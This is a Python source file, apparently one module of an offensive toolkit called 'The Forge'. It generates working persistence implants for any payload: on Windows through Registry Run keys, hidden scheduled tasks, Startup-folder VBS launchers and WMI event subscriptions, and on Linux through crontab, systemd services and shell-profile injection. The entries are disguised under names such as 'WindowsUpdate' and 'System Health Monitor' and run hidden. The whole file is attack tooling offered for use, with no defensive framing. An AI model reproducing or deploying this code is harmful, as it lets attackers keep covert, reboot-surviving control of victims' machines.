"""
The Forge — Persistence Implant
Multiple persistence mechanisms for Windows and Linux.
"""

import textwrap


# ---------------------------------------------------------------------------
# Windows Persistence
# ---------------------------------------------------------------------------

def generate_registry_persistence(
    payload_path: str,
    key_name: str = "WindowsUpdate",
    hive: str = "HKCU"
) -> str:
    """Registry Run key persistence (Python)."""
    if hive == "HKLM":
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    else:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    return textwrap.dedent(f"""\
        import winreg,os,sys,shutil
        
        PAYLOAD=r"{payload_path}"
        KEY_NAME="{key_name}"
        HIVE=winreg.{"HKEY_LOCAL_MACHINE" if hive=="HKLM" else "HKEY_CURRENT_USER"}
        REG_PATH=r"{reg_path}"

        def install():
            # Copy payload to safe location
            dest=os.path.join(os.environ["APPDATA"],os.path.basename(PAYLOAD))
            if not os.path.exists(dest):
                shutil.copy2(PAYLOAD,dest)
            
            # Add registry key
            try:
                key=winreg.OpenKey(HIVE,REG_PATH,0,winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key,KEY_NAME,0,winreg.REG_SZ,dest)
                winreg.CloseKey(key)
                return True
            except Exception as e:
                return False

        def remove():
            try:
                key=winreg.OpenKey(HIVE,REG_PATH,0,winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key,KEY_NAME)
                winreg.CloseKey(key)
                return True
            except:
                return False

        def check():
            try:
                key=winreg.OpenKey(HIVE,REG_PATH,0,winreg.KEY_READ)
                value,_=winreg.QueryValueEx(key,KEY_NAME)
                winreg.CloseKey(key)
                return value
            except:
                return None

        if __name__=="__main__":
            if install():
                print(f"[+] Registry persistence installed: {{KEY_NAME}}")
            else:
                print("[!] Failed to install persistence")
    """)


def generate_scheduled_task(
    payload_path: str,
    task_name: str = "WindowsHealthCheck",
    interval_minutes: int = 30,
    language: str = "python"
) -> str:
    """Scheduled task persistence."""
    if language == "powershell":
        return textwrap.dedent(f"""\
            $action=New-ScheduledTaskAction -Execute "{payload_path}"
            $trigger=New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes {interval_minutes}) -Once -At (Get-Date)
            $settings=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName "{task_name}" -Action $action -Trigger $trigger -Settings $settings -Force
        """).strip()
    else:
        return textwrap.dedent(f"""\
            import subprocess,os
            
            PAYLOAD=r"{payload_path}"
            TASK_NAME="{task_name}"
            INTERVAL={interval_minutes}

            def install():
                cmd=(
                    f'schtasks /create /tn "{{TASK_NAME}}" /tr "{{PAYLOAD}}" '
                    f'/sc minute /mo {{INTERVAL}} /f /rl highest'
                )
                result=subprocess.run(cmd,shell=True,capture_output=True,text=True)
                return result.returncode==0

            def remove():
                cmd=f'schtasks /delete /tn "{{TASK_NAME}}" /f'
                result=subprocess.run(cmd,shell=True,capture_output=True,text=True)
                return result.returncode==0

            def check():
                cmd=f'schtasks /query /tn "{{TASK_NAME}}" /fo csv /nh'
                result=subprocess.run(cmd,shell=True,capture_output=True,text=True)
                return TASK_NAME in result.stdout

            if __name__=="__main__":
                if install():
                    print(f"[+] Scheduled task created: {{TASK_NAME}} (every {{INTERVAL}}m)")
                else:
                    print("[!] Failed to create scheduled task")
        """)


def generate_startup_folder(payload_path: str, link_name: str = "WindowsUpdate") -> str:
    """Startup folder persistence via .lnk shortcut."""
    return textwrap.dedent(f"""\
        import os,sys

        PAYLOAD=r"{payload_path}"
        LINK_NAME="{link_name}"

        def install():
            startup=os.path.join(os.environ["APPDATA"],
                r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            
            try:
                # Create .vbs launcher (more reliable than .lnk without COM)
                vbs_path=os.path.join(startup,f"{{LINK_NAME}}.vbs")
                vbs_content=f'CreateObject("WScript.Shell").Run "{{PAYLOAD}}", 0, False'
                with open(vbs_path,"w") as f:
                    f.write(vbs_content)
                return True
            except:
                return False

        def install_lnk():
            \"\"\"Create proper .lnk shortcut (requires pywin32 or COM).\"\"\"
            try:
                import win32com.client
                startup=os.path.join(os.environ["APPDATA"],
                    r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                
                shell=win32com.client.Dispatch("WScript.Shell")
                shortcut=shell.CreateShortCut(os.path.join(startup,f"{{LINK_NAME}}.lnk"))
                shortcut.Targetpath=PAYLOAD
                shortcut.WindowStyle=7  # Minimized
                shortcut.save()
                return True
            except:
                return install()  # Fallback to VBS

        def remove():
            startup=os.path.join(os.environ["APPDATA"],
                r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            for ext in [".vbs",".lnk",".bat"]:
                path=os.path.join(startup,f"{{LINK_NAME}}{{ext}}")
                if os.path.exists(path):
                    os.remove(path)
            return True

        if __name__=="__main__":
            if install():
                print(f"[+] Startup persistence installed: {{LINK_NAME}}")
    """)


def generate_wmi_persistence(payload_path: str, event_name: str = "SystemHealthMonitor") -> str:
    """WMI event subscription persistence (PowerShell)."""
    return textwrap.dedent(f"""\
        $filterName="{event_name}_Filter"
        $consumerName="{event_name}_Consumer"

        # Create WMI Event Filter (triggers on system startup + every 5 min)
        $filterQuery="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        $filter=Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{{
            Name=$filterName;
            EventNamespace="root\\cimv2";
            QueryLanguage="WQL";
            Query=$filterQuery
        }}

        # Create WMI Event Consumer
        $consumer=Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -Arguments @{{
            Name=$consumerName;
            CommandLineTemplate="{payload_path}"
        }}

        # Bind Filter to Consumer
        Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{{
            Filter=$filter;
            Consumer=$consumer
        }}

        Write-Host "[+] WMI persistence installed: $filterName"
    """).strip()


# ---------------------------------------------------------------------------
# Linux Persistence
# ---------------------------------------------------------------------------

def generate_crontab_persistence(payload_path: str, interval: str = "*/30 * * * *") -> str:
    """Crontab persistence for Linux."""
    return textwrap.dedent(f"""\
        import subprocess,os

        PAYLOAD="{payload_path}"
        INTERVAL="{interval}"

        def install():
            try:
                # Get current crontab
                result=subprocess.run("crontab -l",shell=True,capture_output=True,text=True)
                current=result.stdout if result.returncode==0 else ""
                
                # Check if already installed
                if PAYLOAD in current:
                    return True
                
                # Add new entry
                new_cron=current.rstrip()+"\\n"+f"{{INTERVAL}} {{PAYLOAD}} > /dev/null 2>&1\\n"
                proc=subprocess.Popen("crontab -",shell=True,stdin=subprocess.PIPE)
                proc.communicate(new_cron.encode())
                return proc.returncode==0
            except:
                return False

        def remove():
            try:
                result=subprocess.run("crontab -l",shell=True,capture_output=True,text=True)
                lines=[l for l in result.stdout.split("\\n") if PAYLOAD not in l]
                proc=subprocess.Popen("crontab -",shell=True,stdin=subprocess.PIPE)
                proc.communicate("\\n".join(lines).encode())
                return True
            except:
                return False

        if __name__=="__main__":
            if install():
                print(f"[+] Crontab persistence installed: {{INTERVAL}}")
    """)


def generate_systemd_persistence(
    payload_path: str,
    service_name: str = "system-health",
    description: str = "System Health Monitor"
) -> str:
    """Systemd service persistence for Linux."""
    return textwrap.dedent(f"""\
        import os,subprocess

        SERVICE_NAME="{service_name}"
        PAYLOAD="{payload_path}"

        UNIT_FILE=f\"\"\"[Unit]
        Description={description}
        After=network.target

        [Service]
        Type=simple
        ExecStart={{PAYLOAD}}
        Restart=always
        RestartSec=30

        [Install]
        WantedBy=multi-user.target
        \"\"\"

        def install():
            service_path=f"/etc/systemd/system/{{SERVICE_NAME}}.service"
            try:
                with open(service_path,"w") as f:
                    f.write(UNIT_FILE)
                subprocess.run(f"systemctl daemon-reload",shell=True)
                subprocess.run(f"systemctl enable {{SERVICE_NAME}}",shell=True)
                subprocess.run(f"systemctl start {{SERVICE_NAME}}",shell=True)
                return True
            except:
                # Fallback: user-level systemd
                user_dir=os.path.expanduser("~/.config/systemd/user")
                os.makedirs(user_dir,exist_ok=True)
                service_path=os.path.join(user_dir,f"{{SERVICE_NAME}}.service")
                with open(service_path,"w") as f:
                    f.write(UNIT_FILE)
                subprocess.run("systemctl --user daemon-reload",shell=True)
                subprocess.run(f"systemctl --user enable {{SERVICE_NAME}}",shell=True)
                subprocess.run(f"systemctl --user start {{SERVICE_NAME}}",shell=True)
                return True

        def remove():
            subprocess.run(f"systemctl stop {{SERVICE_NAME}}",shell=True)
            subprocess.run(f"systemctl disable {{SERVICE_NAME}}",shell=True)
            for path in [f"/etc/systemd/system/{{SERVICE_NAME}}.service",
                         os.path.expanduser(f"~/.config/systemd/user/{{SERVICE_NAME}}.service")]:
                if os.path.exists(path):
                    os.remove(path)
            subprocess.run("systemctl daemon-reload",shell=True)
            return True

        if __name__=="__main__":
            if install():
                print(f"[+] Systemd persistence installed: {{SERVICE_NAME}}")
    """)


def generate_bashrc_persistence(payload_path: str) -> str:
    """Bashrc/profile persistence for Linux."""
    return textwrap.dedent(f"""\
        import os

        PAYLOAD="{payload_path}"
        MARKER="# system-health-check"

        def install():
            targets=[
                os.path.expanduser("~/.bashrc"),
                os.path.expanduser("~/.profile"),
                os.path.expanduser("~/.bash_profile"),
            ]
            for target in targets:
                if os.path.exists(target):
                    with open(target,"r") as f:
                        content=f.read()
                    if MARKER in content:
                        continue
                    with open(target,"a") as f:
                        f.write(f"\\n{{MARKER}}\\n({{PAYLOAD}} &) > /dev/null 2>&1\\n")
            return True

        if __name__=="__main__":
            install()
            print("[+] Shell profile persistence installed")
    """)


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "registry": generate_registry_persistence,
    "scheduled_task": generate_scheduled_task,
    "startup_folder": generate_startup_folder,
    "wmi": generate_wmi_persistence,
    "crontab": generate_crontab_persistence,
    "systemd": generate_systemd_persistence,
    "bashrc": generate_bashrc_persistence,
}


def generate(method: str = "registry", **kwargs) -> str:
    gen_func = VARIANTS.get(method.lower())
    if not gen_func:
        raise ValueError(f"Unknown method: {method}. Available: {list(VARIANTS.keys())}")
    return gen_func(**kwargs)


def list_methods() -> list[str]:
    return list(VARIANTS.keys())
